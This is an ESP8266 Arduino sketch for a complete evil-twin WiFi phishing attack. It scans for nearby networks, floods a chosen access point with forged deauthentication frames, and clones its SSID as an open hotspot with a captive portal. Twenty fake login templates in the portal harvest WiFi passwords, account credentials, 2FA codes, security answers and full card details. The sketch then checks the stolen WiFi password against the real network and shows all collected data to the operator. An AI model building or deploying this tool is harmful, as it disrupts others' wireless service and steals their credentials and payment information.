#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";
int _selectedTemplate = 0;
String _collectedData = "";

// Template names
const String templateNames[] = {
  "Firmware Update",
  "ISP Login",
  "Public WiFi",
  "Security Alert",
  "Network Maintenance",
  "Account Verification",
  "Terms Agreement",
  "VIP Access",
  "Bandwidth Upgrade",
  "System Config",
  "Guest Access",
  "Employee Login",
  "Payment Portal",
  "Security Check",
  "Admin Panel",
  "Router Config",
  "WiFi Extender",
  "Smart Home",
  "Conference WiFi",
  "Hotel Network"
};

String header(String title) {
  String CSS = R"=====(
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
    }
    body {
      background: #f5f5f5;
      color: #333;
      line-height: 1.6;
      padding: 0;
      margin: 0;
    }
    .container {
      max-width: 500px;
      margin: 20px auto;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 15px rgba(0,0,0,0.1);
      overflow: hidden;
    }
    .header {
      background: #2c3e50;
      color: white;
      padding: 20px;
      text-align: center;
    }
    .header h1 {
      font-size: 1.5rem;
      margin-bottom: 5px;
    }
    .header p {
      opacity: 0.9;
      font-size: 0.9rem;
    }
    .content {
      padding: 25px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #2c3e50;
    }
    input[type="password"],
    input[type="text"],
    input[type="email"],
    input[type="tel"],
    select,
    textarea {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 1rem;
      transition: border 0.3s;
    }
    input:focus,
    select:focus,
    textarea:focus {
      border-color: #3498db;
      outline: none;
    }
    input[type="submit"],
    button {
      background: #3498db;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      font-weight: 600;
      transition: background 0.3s;
      width: 100%;
    }
    input[type="submit"]:hover,
    button:hover {
      background: #2980b9;
    }
    .notice {
      padding: 15px;
      margin-bottom: 20px;
      border-radius: 4px;
      background: #f8f9fa;
      border-left: 4px solid #3498db;
    }
    .alert {
      background: #ffebee;
      border-left-color: #f44336;
    }
    .success {
      background: #e8f5e9;
      border-left-color: #4caf50;
    }
    .warning {
      background: #fff8e1;
      border-left-color: #ffc107;
    }
    .logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo h3 {
      color: #2c3e50;
      font-size: 1.3rem;
    }
    .footer {
      text-align: center;
      padding: 15px;
      color: #7f8c8d;
      font-size: 0.8rem;
    }
    .template-select {
      margin-bottom: 25px;
    }
    .form-row {
      display: flex;
      gap: 15px;
    }
    .form-row .form-group {
      flex: 1;
    }
    @media (max-width: 600px) {
      .container {
        margin: 10px;
        border-radius: 0;
      }
      .content {
        padding: 20px;
      }
      .form-row {
        flex-direction: column;
        gap: 0;
      }
    }
  )=====";

  return R"=====(
    <!DOCTYPE html>
    <html>
    <head>
      <title>)" + title + R"=====(</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>)=====" + CSS + R"=====(
      </style>
      <meta charset="UTF-8">
    </head>
    <body>
    <div class="container">
    <div class="header">
      <h1>)=====" + _selectedNetwork.ssid + R"=====(</h1>
      <p>Secure Network Access</p>
    </div>
    <div class="content">
  )=====";
}

String footer() {
  return R"=====(
    </div>
    <div class="footer">
      &copy; 2023 Network Services. All rights reserved.
    </div>
    </div>
    </body>
    </html>
  )=====";
}

String templateSelectionHTML() {
  return R"=====(
    <div class="form-group template-select">
      <label>Select Authentication Portal:</label>
      <select name="template" class="form-control" onchange="this.form.submit()">
  )=====" + getTemplateOptions() + R"=====(
      </select>
    </div>
  )=====";
}

String getTemplateOptions() {
  String options = "";
  for (int i = 0; i < 20; i++) {
    options += "<option value='" + String(i) + "'" + 
              (i == _selectedTemplate ? " selected" : "") + ">" + 
              templateNames[i] + "</option>";
  }
  return options;
}

String getCurrentTemplate() {
  switch(_selectedTemplate) {
    case 0: return firmwareUpdateTemplate();
    case 1: return ispLoginTemplate();
    case 2: return publicWifiTemplate();
    case 3: return securityAlertTemplate();
    case 4: return maintenanceTemplate();
    case 5: return accountVerificationTemplate();
    case 6: return termsAgreementTemplate();
    case 7: return vipAccessTemplate();
    case 8: return bandwidthUpgradeTemplate();
    case 9: return systemConfigTemplate();
    case 10: return guestAccessTemplate();
    case 11: return employeeLoginTemplate();
    case 12: return paymentPortalTemplate();
    case 13: return securityCheckTemplate();
    case 14: return adminPanelTemplate();
    case 15: return routerConfigTemplate();
    case 16: return wifiExtenderTemplate();
    case 17: return smartHomeTemplate();
    case 18: return conferenceWifiTemplate();
    case 19: return hotelNetworkTemplate();
    default: return firmwareUpdateTemplate();
  }
}

void collectFormData() {
  _collectedData = "";
  for (int i = 0; i < webServer.args(); i++) {
    if (webServer.argName(i) != "template") {
      _collectedData += webServer.argName(i) + ": " + webServer.arg(i) + "\n";
    }
  }
  Serial.println("Collected Data:\n" + _collectedData);
}

// Template 1: Firmware Update
String firmwareUpdateTemplate() {
  return R"=====(
    <div class="notice warning">
      <h3>Firmware Update Required</h3>
      <p>Your device requires an immediate security update. Please authenticate to proceed.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>WiFi Password:</label>
        <input type="password" name="wifi_password" required>
      </div>
      <input type="submit" value="Continue Update">
    </form>
  )=====";
}

// Template 2: ISP Login
String ispLoginTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Internet Service Provider</h3>
    </div>
    <div class="notice">
      <p>To continue using our network services, please verify your credentials.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Account Number:</label>
        <input type="text" name="account_number" required>
      </div>
      <div class="form-group">
        <label>Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Authenticate">
    </form>
  )=====";
}

// Template 3: Public WiFi
String publicWifiTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Public WiFi Network</h3>
    </div>
    <div class="notice">
      <p>Please register to access our free WiFi service</p>
    </div>
    <form method="post">
      <div class="form-row">
        <div class="form-group">
          <label>First Name:</label>
          <input type="text" name="first_name" required>
        </div>
        <div class="form-group">
          <label>Last Name:</label>
          <input type="text" name="last_name" required>
        </div>
      </div>
      <div class="form-group">
        <label>Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Phone Number:</label>
        <input type="tel" name="phone" required>
      </div>
      <div class="form-group">
        <label>WiFi Password:</label>
        <input type="password" name="wifi_password" required>
      </div>
      <input type="submit" value="Connect">
    </form>
  )=====";
}

// Template 4: Security Alert
String securityAlertTemplate() {
  return R"=====(
    <div class="notice alert">
      <h3>Security Alert</h3>
      <p>Unauthorized access detected from your device. Verify your identity to secure your network connection.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Username:</label>
        <input type="text" name="username" required>
      </div>
      <div class="form-group">
        <label>Password:</label>
        <input type="password" name="password" required>
      </div>
      <div class="form-group">
        <label>Verification Code (sent to your phone):</label>
        <input type="text" name="verification_code" required>
      </div>
      <input type="submit" value="Verify Identity">
    </form>
  )=====";
}

// Template 5: Network Maintenance
String maintenanceTemplate() {
  return R"=====(
    <div class="notice">
      <h3>Network Maintenance</h3>
      <p>We're upgrading our network infrastructure. Please re-authenticate to continue using the service.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Account Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Maintenance Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Proceed">
    </form>
  )=====";
}

// Template 6: Account Verification
String accountVerificationTemplate() {
  return R"=====(
    <div class="notice">
      <h3>Account Verification</h3>
      <p>Your network account requires verification to prevent suspension.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Account Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Phone Number:</label>
        <input type="tel" name="phone" required>
      </div>
      <div class="form-group">
        <label>Account Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Verify Account">
    </form>
  )=====";
}

// Template 7: Terms Agreement
String termsAgreementTemplate() {
  return R"=====(
    <div class="notice">
      <h3>Terms of Service Update</h3>
      <p>Please accept our updated terms and verify your password to continue.</p>
    </div>
    <div class="form-group">
      <textarea readonly rows="4" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:4px;">
By connecting to this network, you agree to our terms of service and acceptable use policy. Unauthorized access is prohibited.
      </textarea>
    </div>
    <form method="post">
      <div class="form-row">
        <div class="form-group">
          <label>Full Name:</label>
          <input type="text" name="full_name" required>
        </div>
        <div class="form-group">
          <label>Email:</label>
          <input type="email" name="email" required>
        </div>
      </div>
      <div class="form-group">
        <label>Network Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Accept & Continue">
    </form>
  )=====";
}

// Template 8: VIP Access
String vipAccessTemplate() {
  return R"=====(
    <div class="logo">
      <h3>VIP Network Access</h3>
    </div>
    <div class="notice">
      <p>This is a premium network. Please enter your VIP credentials to connect.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>VIP ID:</label>
        <input type="text" name="vip_id" required>
      </div>
      <div class="form-group">
        <label>VIP Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Connect">
    </form>
  )=====";
}

// Template 9: Bandwidth Upgrade
String bandwidthUpgradeTemplate() {
  return R"=====(
    <div class="notice success">
      <h3>Bandwidth Upgrade Available</h3>
      <p>Your connection is being upgraded to higher speeds. Please verify your credentials.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Account Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Current Password:</label>
        <input type="password" name="current_password" required>
      </div>
      <div class="form-group">
        <label>New Password:</label>
        <input type="password" name="new_password" required>
      </div>
      <input type="submit" value="Complete Upgrade">
    </form>
  )=====";
}

// Template 10: System Config
String systemConfigTemplate() {
  return R"=====(
    <div class="notice">
      <h3>System Configuration</h3>
      <p>New network settings require administrator authentication.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Admin Username:</label>
        <input type="text" name="username" required>
      </div>
      <div class="form-group">
        <label>Admin Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Authenticate">
    </form>
  )=====";
}

// Template 11: Guest Access
String guestAccessTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Guest Network Access</h3>
    </div>
    <div class="notice">
      <p>Please register for temporary guest access</p>
    </div>
    <form method="post">
      <div class="form-row">
        <div class="form-group">
          <label>First Name:</label>
          <input type="text" name="first_name" required>
        </div>
        <div class="form-group">
          <label>Last Name:</label>
          <input type="text" name="last_name" required>
        </div>
      </div>
      <div class="form-group">
        <label>Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Phone Number:</label>
        <input type="tel" name="phone" required>
      </div>
      <div class="form-group">
        <label>Guest Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Request Access">
    </form>
  )=====";
}

// Template 12: Employee Login
String employeeLoginTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Employee Portal</h3>
    </div>
    <div class="notice">
      <p>Please enter your employee credentials to access the network</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Employee ID:</label>
        <input type="text" name="employee_id" required>
      </div>
      <div class="form-group">
        <label>Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Login">
    </form>
  )=====";
}

// Template 13: Payment Portal
String paymentPortalTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Payment Portal</h3>
    </div>
    <div class="notice">
      <p>Please complete your payment to continue using our services</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Card Number:</label>
        <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
      </div>
      <div class="form-row">
        <div class="form-group">
          <label>Expiry Date:</label>
          <input type="text" name="expiry" placeholder="MM/YY" required>
        </div>
        <div class="form-group">
          <label>CVV:</label>
          <input type="text" name="cvv" placeholder="123" required>
        </div>
      </div>
      <div class="form-group">
        <label>Name on Card:</label>
        <input type="text" name="card_name" required>
      </div>
      <input type="submit" value="Complete Payment">
    </form>
  )=====";
}

// Template 14: Security Check
String securityCheckTemplate() {
  return R"=====(
    <div class="notice alert">
      <h3>Security Check Required</h3>
      <p>We've detected unusual activity from your device. Please verify your identity.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Phone Number:</label>
        <input type="tel" name="phone" required>
      </div>
      <div class="form-group">
        <label>Security Question: What's your mother's maiden name?</label>
        <input type="text" name="security_answer" required>
      </div>
      <input type="submit" value="Verify Identity">
    </form>
  )=====";
}

// Template 15: Admin Panel
String adminPanelTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Admin Control Panel</h3>
    </div>
    <div class="notice">
      <p>Restricted area. Administrator credentials required.</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Admin Username:</label>
        <input type="text" name="username" required>
      </div>
      <div class="form-group">
        <label>Password:</label>
        <input type="password" name="password" required>
      </div>
      <div class="form-group">
        <label>2FA Code:</label>
        <input type="text" name="2fa_code" placeholder="6-digit code" required>
      </div>
      <input type="submit" value="Login">
    </form>
  )=====";
}

// Template 16: Router Config
String routerConfigTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Router Configuration</h3>
    </div>
    <div class="notice">
      <p>Please authenticate to access router settings</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Router Username:</label>
        <input type="text" name="username" value="admin" required>
      </div>
      <div class="form-group">
        <label>Router Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Access Settings">
    </form>
  )=====";
}

// Template 17: WiFi Extender
String wifiExtenderTemplate() {
  return R"=====(
    <div class="logo">
      <h3>WiFi Extender Setup</h3>
    </div>
    <div class="notice">
      <p>Please configure your WiFi extender</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Main Network Name (SSID):</label>
        <input type="text" name="main_ssid" required>
      </div>
      <div class="form-group">
        <label>Main Network Password:</label>
        <input type="password" name="main_password" required>
      </div>
      <div class="form-group">
        <label>Extender Admin Password:</label>
        <input type="password" name="admin_password" required>
      </div>
      <input type="submit" value="Configure Extender">
    </form>
  )=====";
}

// Template 18: Smart Home
String smartHomeTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Smart Home Network</h3>
    </div>
    <div class="notice">
      <p>Connect your smart home devices to the network</p>
    </div>
    <form method="post">
      <div class="form-group">
        <label>Home Owner Name:</label>
        <input type="text" name="owner_name" required>
      </div>
      <div class="form-group">
        <label>Network Password:</label>
        <input type="password" name="password" required>
      </div>
      <div class="form-group">
        <label>Mobile Number:</label>
        <input type="tel" name="phone" required>
      </div>
      <input type="submit" value="Connect Devices">
    </form>
  )=====";
}

// Template 19: Conference WiFi
String conferenceWifiTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Conference WiFi</h3>
    </div>
    <div class="notice">
      <p>Please register to access the conference network</p>
    </div>
    <form method="post">
      <div class="form-row">
        <div class="form-group">
          <label>First Name:</label>
          <input type="text" name="first_name" required>
        </div>
        <div class="form-group">
          <label>Last Name:</label>
          <input type="text" name="last_name" required>
        </div>
      </div>
      <div class="form-group">
        <label>Company:</label>
        <input type="text" name="company" required>
      </div>
      <div class="form-group">
        <label>Email:</label>
        <input type="email" name="email" required>
      </div>
      <div class="form-group">
        <label>Conference Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Connect">
    </form>
  )=====";
}

// Template 20: Hotel Network
String hotelNetworkTemplate() {
  return R"=====(
    <div class="logo">
      <h3>Hotel Guest Network</h3>
    </div>
    <div class="notice">
      <p>Please enter your room details to access the network</p>
    </div>
    <form method="post">
      <div class="form-row">
        <div class="form-group">
          <label>Room Number:</label>
          <input type="text" name="room_number" required>
        </div>
        <div class="form-group">
          <label>Last Name:</label>
          <input type="text" name="last_name" required>
        </div>
      </div>
      <div class="form-group">
        <label>Check-out Date:</label>
        <input type="text" name="checkout" placeholder="DD/MM/YYYY" required>
      </div>
      <div class="form-group">
        <label>WiFi Password:</label>
        <input type="password" name="password" required>
      </div>
      <input type="submit" value="Connect">
    </form>
  )=====";
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("esp-phish", "0x0806");
  dnsServer.start(DNS_PORT, "*", apIP);

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    String html = header("Authentication Failed") +
                  "<div class='notice alert'>"
                  "<h3>Authentication Failed</h3>"
                  "<p>Invalid credentials. Please try again.</p>"
                  "</div>"
                  "<script>setTimeout(function(){ window.location.href='/'; }, 3000);</script>"
                  + footer();
    webServer.send(200, "text/html", html);
    Serial.println("Authentication failed");
  } else {
    _correct = "<div class='notice success'>"
               "<h3>Authentication Successful</h3>"
               "<p>You are now connected to the network.</p>"
               "</div>";
    _collectedData += "WiFi Password: " + _tryPassword + "\n";
    
    Serial.println("Collected Data:\n" + _collectedData);
    
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("esp-phish", "0x0806");
    dnsServer.start(DNS_PORT, "*", apIP);
    
    String html = header("Access Granted") +
                  _correct +
                  "<a href='/admin'><button>Return to Admin Panel</button></a>"
                  + footer();
    webServer.send(200, "text/html", html);
  }
}

void handleIndex() {
  if (webServer.hasArg("template")) {
    _selectedTemplate = webServer.arg("template").toInt();
  }

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
    } else {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("esp-phish", "0x0806");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
    webServer.sendHeader("Location", "/admin", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (webServer.method() == HTTP_POST && webServer.args() > 0) {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
    }
    collectFormData();
    
    if (hotspot_active) {
      bool wasDeauthing = deauthing_active;
      if (wasDeauthing) deauthing_active = false;
      
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      
      String html = header("Verifying Credentials") +
                    "<div class='notice'>"
                    "<h3>Verifying Credentials</h3>"
                    "<p>Please wait while we verify your information...</p>"
                    "<progress value='50' max='100'></progress>"
                    "</div>"
                    "<script>setTimeout(function(){ window.location.href='/result'; }, 15000);</script>"
                    + footer();
      webServer.send(200, "text/html", html);
      
      if (wasDeauthing) deauthing_active = true;
      return;
    }
  }

  if (!hotspot_active) {
    String html = header("Network Administration");
    
    if (_correct != "") {
      html += _correct;
    }
    
    html += "<form method='post'>"
            "<div class='form-group'>"
            "<label>Select Target Network:</label>"
            "<select name='ap' class='form-control'>";
    
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      bool isSelected = bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6);
      html += "<option value='" + bytesToStr(_networks[i].bssid, 6) + "'" + 
              (isSelected ? " selected" : "") + ">" + 
              _networks[i].ssid + " (Ch " + String(_networks[i].ch) + ")</option>";
    }
    
    html += "</select>"
            "</div>"
            "<div class='button-group'>"
            "<button type='submit' name='scan' value='1'>Rescan Networks</button>"
            "</div>"
            "</form>"
            "<form method='post'>"
            "<div class='button-group'>"
            "<button type='submit' name='deauth' value='" + String(deauthing_active ? "stop" : "start") + "'" + 
            (_selectedNetwork.ssid == "" ? " disabled" : "") + ">" +
            (deauthing_active ? "Stop Deauth" : "Start Deauth") + "</button>"
            "<button type='submit' name='hotspot' value='" + String(hotspot_active ? "stop" : "start") + "'" + 
            (_selectedNetwork.ssid == "" ? " disabled" : "") + ">" +
            (hotspot_active ? "Stop AP Clone" : "Start AP Clone") + "</button>"
            "</div>"
            "</form>";
    
    if (_collectedData != "") {
      html += "<div class='notice'>"
              "<h3>Collected Data</h3>"
              "<pre style='white-space:pre-wrap;word-wrap:break-word;'>" + _collectedData + "</pre>"
              "</div>";
    }
    
    html += footer();
    webServer.send(200, "text/html", html);
  } else {
    String html = header(templateNames[_selectedTemplate]) + 
                 templateSelectionHTML() + 
                 getCurrentTemplate() + 
                 footer();
    webServer.send(200, "text/html", html);
  }
}

void handleAdmin() {
  String html = header("Admin Dashboard");
  
  if (_correct != "") {
    html += _correct;
  }
  
  html += "<form method='post'>"
          "<div class='form-group'>"
          "<label>Select Target Network:</label>"
          "<select name='ap' class='form-control'>";
  
  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") break;
    bool isSelected = bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6);
    html += "<option value='" + bytesToStr(_networks[i].bssid, 6) + "'" + 
            (isSelected ? " selected" : "") + ">" + 
            _networks[i].ssid + " (Ch " + String(_networks[i].ch) + ")</option>";
  }
  
  html += "</select>"
          "</div>"
          "<div class='button-group'>"
          "<button type='submit' name='scan' value='1'>Rescan Networks</button>"
          "</div>"
          "</form>"
          "<form method='post'>"
          "<div class='button-group'>"
          "<button type='submit' name='deauth' value='" + String(deauthing_active ? "stop" : "start") + "'" + 
          (_selectedNetwork.ssid == "" ? " disabled" : "") + ">" +
          (deauthing_active ? "Stop Deauth" : "Start Deauth") + "</button>"
          "<button type='submit' name='hotspot' value='" + String(hotspot_active ? "stop" : "start") + "'" + 
          (_selectedNetwork.ssid == "" ? " disabled" : "") + ">" +
          (hotspot_active ? "Stop AP Clone" : "Start AP Clone") + "</button>"
          "</div>"
          "</form>";
  
  if (_collectedData != "") {
    html += "<div class='notice'>"
            "<h3>Collected Data</h3>"
            "<pre style='white-space:pre-wrap;word-wrap:break-word;'>" + _collectedData + "</pre>"
            "</div>";
  }
  
  html += footer();
  webServer.send(200, "text/html", html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
                                0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("WiFi: Disconnected");
    } else {
      Serial.println("WiFi: Connected");
    }
    wifinow = millis();
  }
}
